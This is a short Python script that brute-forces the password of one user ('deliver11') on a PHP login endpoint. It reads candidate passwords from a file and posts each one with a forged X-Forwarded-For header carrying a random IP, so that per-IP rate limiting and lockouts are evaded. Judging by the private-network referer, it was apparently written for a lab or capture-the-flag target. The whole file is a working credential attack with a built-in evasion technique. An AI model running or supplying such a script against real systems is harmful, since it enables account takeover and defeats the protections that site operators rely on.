import requests
import random
import time


target_url = "http://IP/auth.php"
session_id = "sessionID"
password_file = "/tmp/deliver11_pass.txt"
username = "deliver11"

def generate_random_ip():
    return ".".join(map(str, (random.randint(1, 254) for _ in range(4))))

def attempt_brute_force():
    try:
        with open(password_file, 'r') as f:
            for line in f:
                password = line.strip()
                if not password:
                    continue

                fake_ip = generate_random_ip()
                headers = {
                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:146.0) Gecko/20100101 Firefox/146.0",
                    "Accept": "application/json, text/javascript, */*; q=0.01",
                    "Accept-Language": "en-GB,en;q=0.5",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "X-Requested-With": "XMLHttpRequest", 
                    "Referer": "http://10.49.181.239/login.php",
                    "Cookie": f"PHPSESSID={session_id}",
                    "X-Forwarded-For": fake_ip
                }
                
                data = {
                    "username": username,
                    "password": password
                }

                try:
                    
                    response = requests.post(target_url, headers=headers, data=data, timeout=5)
                    
                    print(f"[*] Trying {password} | IP: {fake_ip} | Status: {response.status_code}", end='\r')

                    res_json = response.json()
                    if res_json.get("success"):
                        print(f"\n\n[!!!] SUCCESS! User: {username} | Password: {password}")
                        return

                except Exception as e:
                    print(f"\n[-] Error during request for {password}: {e}")
                    continue

        print("\n[!] Finished: No valid password found in the list.")

    except FileNotFoundError:
        print(f"[!] Error: {password_file} not found.")

if __name__ == "__main__":
    attempt_brute_force()